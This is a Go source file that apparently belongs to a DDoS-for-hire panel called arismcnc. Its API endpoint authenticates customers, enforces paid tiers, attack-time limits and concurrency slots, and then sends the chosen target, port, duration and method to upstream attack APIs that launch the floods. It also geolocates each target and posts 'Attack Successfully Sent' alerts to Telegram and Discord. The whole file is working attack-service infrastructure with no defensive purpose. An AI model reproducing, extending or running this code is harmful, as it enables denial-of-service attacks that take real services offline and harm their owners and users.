package managers

import (
	"arismcnc/database"
	"arismcnc/utils"
	"bytes"
	"encoding/json"
	"fmt"
	"html/template"
	"io"
	"net"
	"net/http"
	"os"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

var (
	notificationConfig *NotificationConfig
	configMutex        sync.RWMutex
)


type NotificationConfig struct {
	Global struct {
		Enabled     bool `json:"enabled"`
		LogInFiles  bool `json:"log_in_files"`
	} `json:"global"`
	DiscordIntegration map[string]struct {
		WebhookURL string `json:"webhook_url"`
		Title      string `json:"title"`
		Image      string `json:"image"`
		HexColor   string `json:"hex_color"`
		Enabled    bool   `json:"enabled"`
	} `json:"Discord_Integration"`
	TelegramIntegration map[string]struct {
		Token   string `json:"token"`
		ChatID  string `json:"chat_id"`
		Title   string `json:"title"`
		Enabled bool   `json:"enabled"`
	} `json:"Telegram_Integration"`
}


func loadNotificationConfig() (*NotificationConfig, error) {
	configMutex.Lock()
	defer configMutex.Unlock()

	if notificationConfig != nil {
		return notificationConfig, nil
	}

	file, err := os.Open("assets/logs/logs.json")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var config NotificationConfig
	decoder := json.NewDecoder(file)
	err = decoder.Decode(&config)
	if err != nil {
		return nil, err
	}

	notificationConfig = &config
	return notificationConfig, nil
}


func sendTelegramNotification(token, chatID, title, message string) error {
	if token == "" || chatID == "" {
		return fmt.Errorf("telegram configuration missing")
	}

	bot, err := tgbotapi.NewBotAPI(token)
	if err != nil {
		return err
	}

	chatIDInt, err := strconv.ParseInt(chatID, 10, 64)
	if err != nil {
		return err
	}

	
	fullMessage := message
	msg := tgbotapi.NewMessage(chatIDInt, fullMessage)
	msg.ParseMode = "Markdown"
	msg.DisableNotification = false

	_, err = bot.Send(msg)
	return err
}


func sendDiscordNotification(webhookURL, title, message, color, image string) error {
	if webhookURL == "" {
		return fmt.Errorf("discord webhook URL not configured")
	}

	
	color = strings.TrimPrefix(color, "#")

	
	colorDecimal, err := strconv.ParseInt(color, 16, 64)
	if err != nil {
		colorDecimal = 65280 
	}

	payload := map[string]interface{}{
		"embeds": []map[string]interface{}{
			{
				"title":       title,
				"description": message,
				"color":       colorDecimal,
				"timestamp":   time.Now().Format(time.RFC3339),
				"thumbnail": map[string]string{
					"url": image,
				},
				"fields": []map[string]string{
					{
						"name":  "✅ Status",
						"value": "Attack Successfully Sent",
					},
				},
			},
		},
	}

	jsonData, err := json.Marshal(payload)
	if err != nil {
		return err
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonData))
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusNoContent && resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord webhook error: %s", string(body))
	}

	return nil
}


func notifyAPIAttack(username, target, port, duration, method string) {
	
	config, err := loadNotificationConfig()
	if err != nil {
		return 
	}

	
	var telegramConfig, discordConfig struct {
		enabled bool
		token   string
		chatID  string
		title   string
		webhook string
		color   string
		image   string
	}

	
	if config.TelegramIntegration != nil {
		if attackConfig, ok := config.TelegramIntegration["Attack_Sent"]; ok {
			if attackConfig.Enabled && attackConfig.Token != "" && attackConfig.ChatID != "" {
				telegramConfig.enabled = true
				telegramConfig.token = attackConfig.Token
				telegramConfig.chatID = attackConfig.ChatID
				telegramConfig.title = attackConfig.Title
			}
		}
		
		if !telegramConfig.enabled {
			if apiLogsConfig, ok := config.TelegramIntegration["API_Logs"]; ok {
				if apiLogsConfig.Enabled && apiLogsConfig.Token != "" && apiLogsConfig.ChatID != "" {
					telegramConfig.enabled = true
					telegramConfig.token = apiLogsConfig.Token
					telegramConfig.chatID = apiLogsConfig.ChatID
					telegramConfig.title = apiLogsConfig.Title
				}
			}
		}
	}

	
	if config.DiscordIntegration != nil {
		if attackConfig, ok := config.DiscordIntegration["Attack_Sent"]; ok {
			if attackConfig.Enabled && attackConfig.WebhookURL != "" {
				discordConfig.enabled = true
				discordConfig.webhook = attackConfig.WebhookURL
				discordConfig.title = attackConfig.Title
				discordConfig.color = attackConfig.HexColor
				discordConfig.image = attackConfig.Image
			}
		}
		
		if !discordConfig.enabled {
			if apiLogsConfig, ok := config.DiscordIntegration["API_Logs"]; ok {
				if apiLogsConfig.Enabled && apiLogsConfig.WebhookURL != "" {
					discordConfig.enabled = true
					discordConfig.webhook = apiLogsConfig.WebhookURL
					discordConfig.title = apiLogsConfig.Title
					discordConfig.color = apiLogsConfig.HexColor
					discordConfig.image = apiLogsConfig.Image
				}
			}
		}
	}

	
	if !telegramConfig.enabled && !discordConfig.enabled {
		return
	}

	
	message := fmt.Sprintf("✅ *Attack Successfully Sent via API* ✅\n\n"+
		"⚠️ *Username:* `%s`\n"+
		"🎯 *Target:* `%s`\n"+
		"🔌 *Port:* `%s`\n"+
		"⏱ *Duration:* `%s`\n"+
		"⚡  *Method:* `%s`\n"+
		"🕐 *Date/Time:* %s",
		username, target, port, duration, method,
		time.Now().Format("2006-01-02 15:04:05 MST"))

	
	if telegramConfig.enabled {
		go func() {
			err := sendTelegramNotification(
				telegramConfig.token,
				telegramConfig.chatID,
				telegramConfig.title,
				message,
			)
			if err != nil {
				
			}
		}()
	}

	
	if discordConfig.enabled {
		go func() {
			err := sendDiscordNotification(
				discordConfig.webhook,
				discordConfig.title,
				message,
				discordConfig.color,
				discordConfig.image,
			)
			if err != nil {
				
			}
		}()
	}
}


func notifyAPIBlacklistAttempt(username, target, port, duration, method string) {
	
	config, err := loadNotificationConfig()
	if err != nil {
		return 
	}

	
	var telegramConfig, discordConfig struct {
		enabled bool
		token   string
		chatID  string
		title   string
		webhook string
		color   string
		image   string
	}

	if config.TelegramIntegration != nil {
		if blacklistConfig, ok := config.TelegramIntegration["Blacklisted_Host"]; ok {
			if blacklistConfig.Enabled && blacklistConfig.Token != "" && blacklistConfig.ChatID != "" {
				telegramConfig.enabled = true
				telegramConfig.token = blacklistConfig.Token
				telegramConfig.chatID = blacklistConfig.ChatID
				telegramConfig.title = blacklistConfig.Title
			}
		}
	}

	if config.DiscordIntegration != nil {
		if blacklistConfig, ok := config.DiscordIntegration["Blacklisted_Host"]; ok {
			if blacklistConfig.Enabled && blacklistConfig.WebhookURL != "" {
				discordConfig.enabled = true
				discordConfig.webhook = blacklistConfig.WebhookURL
				discordConfig.title = blacklistConfig.Title
				discordConfig.color = blacklistConfig.HexColor
				discordConfig.image = blacklistConfig.Image
			}
		}
	}

	
	if !telegramConfig.enabled && !discordConfig.enabled {
		return
	}

	
	message := fmt.Sprintf("🚫 *Blocked Attack Attempt (API)* 🚫\n\n"+
		"⚠️ *Username:* `%s`\n"+
		"🎯*Target:* `%s`\n"+
		"🔌*Port:* `%s`\n"+
		"⏱*Duration:* `%s`\n"+
		"⚡ *Method:* `%s`\n"+
		"🕐*Date/Time:* %s",
		username, target, port, duration, method,
		time.Now().Format("2006-01-02 15:04:05 MST"))

	
	if telegramConfig.enabled {
		go func() {
			err := sendTelegramNotification(
				telegramConfig.token,
				telegramConfig.chatID,
				telegramConfig.title,
				message,
			)
			if err != nil {
				
			}
		}()
	}

	
	if discordConfig.enabled {
		go func() {
			err := sendDiscordNotification(
				discordConfig.webhook,
				discordConfig.title,
				message,
				discordConfig.color,
				discordConfig.image,
			)
			if err != nil {
				
			}
		}()
	}
}

func CheckVIPStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasVipPermission(method) {
		return userInfo.Vip == 1, nil
	}
	return true, nil
}

func CheckPrivateStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasPrivatePermission(method) {
		return userInfo.Private == 1, nil
	}
	return true, nil
}

var userLocks sync.Map

func getUserLock(username string) *sync.Mutex {
	lock, _ := userLocks.LoadOrStore(username, &sync.Mutex{})
	return lock.(*sync.Mutex)
}

func applyAPILoadingDelay(config *utils.Config) {
	apiOptions := config.GetAPIOptions()
	
	if apiOptions.APILoadingDelay.Enabled {
		delaySeconds := apiOptions.APILoadingDelay.DelaySeconds
		time.Sleep(time.Duration(delaySeconds) * time.Second)
	}
}

func fetchTargetInfo(target string) map[string]string {
	cleanTarget := strings.TrimPrefix(target, "http://")
	cleanTarget = strings.TrimPrefix(cleanTarget, "https://")
	cleanTarget = strings.Split(cleanTarget, "/")[0]
	cleanTarget = strings.Split(cleanTarget, ":")[0]

	resolvedIP, err := resolveDomainToIP(cleanTarget)
	if err != nil {
		return getBasicInfoFromDomain(cleanTarget)
	}

	return fetchTargetInfoIPAPI(resolvedIP)
}

func resolveDomainToIP(domain string) (string, error) {
	if net.ParseIP(domain) != nil {
		return domain, nil
	}

	ips, err := net.LookupIP(domain)
	if err != nil {
		return "", fmt.Errorf("DNS lookup failed: %v", err)
	}
	
	if len(ips) == 0 {
		return "", fmt.Errorf("no IP addresses found for domain")
	}

	for _, ip := range ips {
		if ip.To4() != nil {
			return ip.String(), nil
		}
	}

	return ips[0].String(), nil
}

func fetchTargetInfoIPAPI(ip string) map[string]string {
	dataMap := make(map[string]string)
	
	url := "http://ip-api.com/json/" + ip + "?fields=status,message,country,countryCode,region,regionName,city,isp,org,as,query,zip,timezone"
	
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(url)
	if err != nil {
		return getBasicInfoFromIP(ip)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return getBasicInfoFromIP(ip)
	}

	var result struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
		RegionName  string `json:"regionName"`
		City        string `json:"city"`
		ISP         string `json:"isp"`
		Org         string `json:"org"`
		AS          string `json:"as"`
		Zip         string `json:"zip"`
		Timezone    string `json:"timezone"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return getBasicInfoFromIP(ip)
	}

	if result.Status != "success" {
		return getBasicInfoFromIP(ip)
	}

	dataMap["country"] = result.Country
	dataMap["countrycode"] = result.CountryCode
	dataMap["org"] = result.Org
	if dataMap["org"] == "" {
		dataMap["org"] = result.ISP
	}
	dataMap["region"] = result.RegionName
	dataMap["city"] = result.City
	dataMap["isp"] = result.ISP
	dataMap["asn"] = result.AS
	dataMap["zip"] = result.Zip
	dataMap["timezone"] = result.Timezone

	if dataMap["country"] == "" {
		dataMap["country"] = "Unknown"
	}
	if dataMap["org"] == "" {
		dataMap["org"] = "Unknown"
	}
	if dataMap["region"] == "" {
		dataMap["region"] = "Unknown"
	}
	if dataMap["asn"] == "" {
		dataMap["asn"] = "Unknown"
	}
	if dataMap["zip"] == "" {
		dataMap["zip"] = "Unknown"
	}
	if dataMap["timezone"] == "" {
		dataMap["timezone"] = "Unknown"
	}

	return dataMap
}

func getBasicInfoFromIP(ip string) map[string]string {
	if strings.HasPrefix(ip, "192.168.") || strings.HasPrefix(ip, "10.") || strings.HasPrefix(ip, "172.16.") {
		return map[string]string{
			"country":     "Local Network",
			"countrycode": "LOCAL",
			"org":         "Private IP",
			"region":      "Internal",
			"city":        "Local",
			"isp":         "Private Network",
			"asn":         "AS0",
			"zip":         "00000",
			"timezone":    "UTC",
		}
	}

	return map[string]string{
		"country":     "Unknown",
		"countrycode": "UNK",
		"org":         "Unknown",
		"region":      "Unknown",
		"city":        "Unknown",
		"isp":         "Unknown",
		"asn":         "Unknown",
		"zip":         "Unknown",
		"timezone":    "Unknown",
	}
}

func getBasicInfoFromDomain(domain string) map[string]string {
	parts := strings.Split(domain, ".")
	if len(parts) < 2 {
		return map[string]string{
			"country":     "Unknown",
			"countrycode": "UNK",
			"org":         "Unknown",
			"region":      "Unknown",
			"city":        "Unknown",
			"isp":         "Unknown",
			"asn":         "Unknown",
			"zip":         "Unknown",
			"timezone":    "Unknown",
		}
	}

	tld := strings.ToLower(parts[len(parts)-1])

	tldToCountry := map[string]string{
		"br": "Brazil",
		"us": "United States",
		"uk": "United Kingdom",
		"de": "Germany",
		"fr": "France",
		"jp": "Japan",
		"cn": "China",
		"ru": "Russia",
		"ca": "Canada",
		"au": "Australia",
		"in": "India",
		"it": "Italy",
		"es": "Spain",
		"nl": "Netherlands",
		"se": "Sweden",
		"no": "Norway",
		"dk": "Denmark",
		"fi": "Finland",
		"pl": "Poland",
		"mx": "Mexico",
		"ar": "Argentina",
		"cl": "Chile",
		"co": "Colombia",
	}

	country := "Unknown"
	countryCode := "UNK"
	if found, exists := tldToCountry[tld]; exists {
		country = found
		countryCode = strings.ToUpper(tld)
	}

	org := "Unknown"
	if strings.Contains(domain, "google") {
		org = "Google"
	} else if strings.Contains(domain, "amazon") || strings.Contains(domain, "aws") {
		org = "Amazon"
	} else if strings.Contains(domain, "microsoft") {
		org = "Microsoft"
	} else if strings.Contains(domain, "cloudflare") {
		org = "Cloudflare"
	} else if strings.Contains(domain, "facebook") {
		org = "Facebook"
	} else if strings.Contains(domain, "lula") {
		org = "Brazil Government"
	}

	return map[string]string{
		"country":     country,
		"countrycode": countryCode,
		"org":         org,
		"region":      "Unknown",
		"city":        "Unknown",
		"isp":         org,
		"asn":         "Unknown",
		"zip":         "Unknown",
		"timezone":    "Unknown",
	}
}

type AttackSentPage struct {
	Target      string
	Port        string
	Duration    string
	Method      string
	Concurrents string
	Running     string
	Tts         string
	Asn         string
	Region      string
	Country     string
	Countrycode string
	City        string
	Zip         string
	Isp         string
	Org         string
	Timezone    string
	Error       string
}

func processAttack(username, password, target, port, timeStr, method string, db *database.Database, config *utils.Config) (*AttackSentPage, error) {
	user := db.GetAccountInfo(username)

	userLock := getUserLock(username)
	userLock.Lock()
	defer userLock.Unlock()

	if user.ApiAccess != 1 {
		return nil, fmt.Errorf("API access is denied.")
	}
	if db.IsAccountExpired(username) {
		return nil, fmt.Errorf("Account has expired.")
	}
	if !config.Attacks_enabled && user.Admin != 1 {
		return nil, fmt.Errorf("Attacks are disabled.")
	}

	methodConfig, err := getMethodConfig(method)
	if err != nil || methodConfig == nil {
		return nil, fmt.Errorf("Method not found.")
	}
	if !isValidTarget(target) {
		return nil, fmt.Errorf("Invalid target format.")
	}

	currentAttacks := db.GetCurrentAttacksLength()
	if currentAttacks > config.Global_slots {
		return nil, fmt.Errorf("Global network slots (" + strconv.Itoa(config.Global_slots) + ") are currently in use.")
	}

	if cooldown := db.HowLongOnCooldown(username, user.Cooldown); cooldown > 0 {
		return nil, fmt.Errorf("Cooldown active (%d seconds left).", cooldown)
	}
	if user.Admin != 1 && config.Global_cooldown > 0 {
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			return nil, fmt.Errorf("Global cooldown active (%d seconds left).", globalCooldown)
		}
	}
	if db.GetUserCurrentAttacksCount(username) >= user.Concurrents {
		return nil, fmt.Errorf("All concurrent attack slots are in use.")
	}
	if user.PowerSaving != 1 && db.IsTargetCurrentlyUnderAttack(target) {
		return nil, fmt.Errorf("Target is already under attack.")
	}
	if user.BypassSpam != 1 && db.IsSpamming(username) {
		return nil, fmt.Errorf("Spam protection active. Please wait.")
	}

	if user.BypassBlacklist != 1 {
		if blocked, err := isTargetBlocked(target); err != nil {
			return nil, fmt.Errorf("Error checking blacklist.")
		} else if blocked {
			lm, err := NewLogManager("./assets/logs/logs.json")
			if err != nil {
				os.Exit(1)
			}
			defer lm.Close()

			lm.Log("User tried to attack blocked target (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
			
			
			go notifyAPIBlacklistAttempt(username, target, port, timeStr, method)
			
			return nil, fmt.Errorf("Target is blocked.")
		}
	}

	timeInt, err := strconv.Atoi(timeStr)
	if err != nil {
		return nil, fmt.Errorf("Invalid time format: %s", timeStr)
	}
	if timeInt > user.Maxtime {
		return nil, fmt.Errorf("Your max attack time is %d.", user.Maxtime)
	}

	if valid, err := CheckVIPStatus(username, method, db); !valid || err != nil {
		return nil, fmt.Errorf("VIP access required for this method.")
	}
	if valid, err := CheckPrivateStatus(username, method, db); !valid || err != nil {
		return nil, fmt.Errorf("PRIVATE access required for this method.")
	}

	applyAPILoadingDelay(config)

	targetInfo := fetchTargetInfo(target)
	
	lm, err := NewLogManager("./assets/logs/logs.json")
	if err != nil {
		os.Exit(1)
	}
	defer lm.Close()
	lm.Log("New Attack (API)!\nUsername: " + username + "\nTarget: " + target + "\nPort: " + port + "\nTime: " + timeStr + "\nMethod: " + method + "\n----------------------")
	db.LogAttack(username, target, port, parseTime(timeStr), method)

	
	go notifyAPIAttack(username, target, port, timeStr, method)

	attackPage := &AttackSentPage{
		Target:      target,
		Port:        port,
		Duration:    timeStr,
		Method:      method,
		Concurrents: fmt.Sprintf("%d/%d", db.GetUserCurrentAttacksCount(username)+1, user.Concurrents),
		Running:     "Yes",
		Tts:         "Completed",
		Asn:         targetInfo["asn"],
		Region:      targetInfo["region"],
		Country:     targetInfo["country"],
		Countrycode: targetInfo["countrycode"],
		City:        targetInfo["city"],
		Zip:         targetInfo["zip"],
		Isp:         targetInfo["isp"],
		Org:         targetInfo["org"],
		Timezone:    targetInfo["timezone"],
		Error:       "false",
	}

	go func() {
		responses := make(chan string, len(methodConfig.API))
		var wg sync.WaitGroup

		for _, api := range methodConfig.API {
			fullURL := replacePlaceholdersFunnel(api, username, password, target, port, timeStr, method)

			wg.Add(1)
			go func(link string) {
				defer wg.Done()
				res, err := http.Get(link)
				if err != nil {
					responses <- fmt.Sprintf("[ATTACK] %s response: error", link)
					return
				}
				defer res.Body.Close()

				body, err := io.ReadAll(res.Body)
				if err != nil {
					responses <- fmt.Sprintf("[ATTACK] %s response: read error", link)
					return
				}

				responses <- fmt.Sprintf("[ATTACK] %s response: %s", link, string(body))
			}(fullURL)
		}

		wg.Wait()
		close(responses)

		for resp := range responses {
			_ = resp
		}
	}()

	return attackPage, nil
}


func FunnelCreate(w http.ResponseWriter, r *http.Request, db *database.Database, config *utils.Config) {
	if r.Method != http.MethodGet {
		respondWithJSON(w, true, "Invalid request method.")
		return
	}

	params := r.URL.Query()
	username, password := params.Get("username"), params.Get("password")
	target, port, timeStr, method := params.Get("target"), params.Get("port"), params.Get("time"), params.Get("method")

	if username == "" || password == "" || target == "" || port == "" || timeStr == "" || method == "" {
		respondWithJSON(w, true, "Missing required parameters.")
		return
	}
	if !db.AuthenticateUser(username, password) {
		respondWithJSON(w, true, "Invalid credentials.")
		return
	}

	attackPage, err := processAttack(username, password, target, port, timeStr, method, db, config)
	if err != nil {
		respondWithJSON(w, true, err.Error())
		return
	}

	serveAttackSentHTML(w, attackPage)
}

func serveAttackSentHTML(w http.ResponseWriter, attackPage *AttackSentPage) {
	if _, err := os.Stat("assets/public/attack-sent.html"); os.IsNotExist(err) {
		respondWithJSON(w, false, map[string]interface{}{
			"message": "Attack Sent",
			"data":    attackPage,
		})
		return
	}

	tmpl, err := template.ParseFiles("assets/public/attack-sent.html")
	if err != nil {
		respondWithJSON(w, false, map[string]interface{}{
			"message": "Attack Sent",
			"data":    attackPage,
		})
		return
	}

	data := struct {
		Attack_sent []*AttackSentPage
	}{
		Attack_sent: []*AttackSentPage{attackPage},
	}

  w.Header().Set("Content-Type", "text/html; charset=utf-8")
  if err := tmpl.Execute(w, data); err != nil {
      http.Error(w, "Internal Server Error (template)", 500)
      return
  }
}

func respondWithJSON(w http.ResponseWriter, isError bool, message interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"error":   isError,
		"message": message,
	})
}

func getMethodConfig(method string) (*utils.Method, error) {
	return utils.GetMethodConfig(method)
}

func parseTime(timeStr string) int {
	timeInt, err := strconv.Atoi(timeStr)
	if err != nil {
		return 0
	}
	return timeInt
}

func replacePlaceholdersFunnel(url, username, password, target, port, time, method string) string {
	replacements := map[string]string{
		"{USERNAME}": username,
		"{PASSWORD}": password,
		"{HOST}":     target,
		"{PORT}":     port,
		"{TIME}":     time,
		"{METHOD}":   method,
	}
	for placeholder, value := range replacements {
		url = strings.ReplaceAll(url, placeholder, value)
	}
	return url
}

func sendRequest(url string) error {
	client := &http.Client{}
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return fmt.Errorf("failed to create request: %w", err)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	return nil
}

func isTargetBlocked(target string) (bool, error) {
	blacklist := utils.ReadBlacklist("assets/blacklists/list.json")
	
	cleanTarget := strings.TrimPrefix(target, "http://")
	cleanTarget = strings.TrimPrefix(cleanTarget, "https://")
	cleanTarget = strings.Split(cleanTarget, "/")[0]
	cleanTarget = strings.Split(cleanTarget, ":")[0]

	for _, blockedEntry := range blacklist.IPs {
		if blockedEntry == "" {
			continue
		}

		cleanBlocked := strings.TrimPrefix(blockedEntry, "http://")
		cleanBlocked = strings.TrimPrefix(cleanBlocked, "https://")
		cleanBlocked = strings.Split(cleanBlocked, "/")[0]
		cleanBlocked = strings.Split(cleanBlocked, ":")[0]

		if cleanTarget == cleanBlocked {
			return true, nil
		}

		if strings.HasPrefix(cleanBlocked, ".") && strings.HasSuffix(cleanTarget, cleanBlocked) {
			return true, nil
		}

		if strings.Contains(cleanTarget, cleanBlocked) && cleanBlocked != "" {
			return true, nil
		}
	}

	hasValidASN := false
	for _, asn := range blacklist.ASNs {
		if asn != "" && asn != " " {
			hasValidASN = true
			break
		}
	}

	if hasValidASN {
		asn := getTargetASNForAPI(cleanTarget)
		if asn != "" {
			cleanASN := strings.TrimPrefix(strings.ToUpper(asn), "AS")
			
			for _, blockedASN := range blacklist.ASNs {
				if blockedASN == "" || blockedASN == " " {
					continue
				}

				cleanBlockedASN := strings.TrimPrefix(strings.ToUpper(blockedASN), "AS")
				
				if cleanASN == cleanBlockedASN {
					return true, nil
				}
			}
		} 
	}
	return false, nil
}

func getTargetASNForAPI(target string) string {
	target = strings.TrimPrefix(target, "http://")
	target = strings.TrimPrefix(target, "https://")
	target = strings.Split(target, "/")[0]
	target = strings.Split(target, ":")[0]

	ip := target
	if net.ParseIP(target) == nil {
		ips, err := net.LookupIP(target)
		if err != nil || len(ips) == 0 {
			return ""
		}
		ip = ips[0].String()
	}

	asn := lookupASNIPAPIForAPI(ip)
	if asn != "" {
		return asn
	}

	asn = lookupASNIPInfoForAPI(ip)
	if asn != "" {
		return asn
	}

	return ""
}

func lookupASNIPAPIForAPI(ip string) string {
	apiURL := fmt.Sprintf("http://ip-api.com/json/%s?fields=as", ip)
	
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ""
	}

	var result struct {
		AS string `json:"as"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	if result.AS != "" {
		parts := strings.Fields(result.AS)
		if len(parts) > 0 {
			return parts[0]
		}
	}

	return ""
}

func lookupASNIPInfoForAPI(ip string) string {
	apiURL := fmt.Sprintf("https://ipinfo.io/%s/json", ip)
	
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ""
	}

	var result struct {
		Org string `json:"org"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return ""
	}

	if result.Org != "" {
		parts := strings.Fields(result.Org)
		if len(parts) > 0 && strings.HasPrefix(parts[0], "AS") {
			return parts[0]
		}
	}

	return ""
}

func isValidTarget(target string) bool {
	if net.ParseIP(target) != nil {
		return true
	}
	regex := `^(http://|https://|www\.).+`
	matched, _ := regexp.MatchString(regex, target)
	return matched
}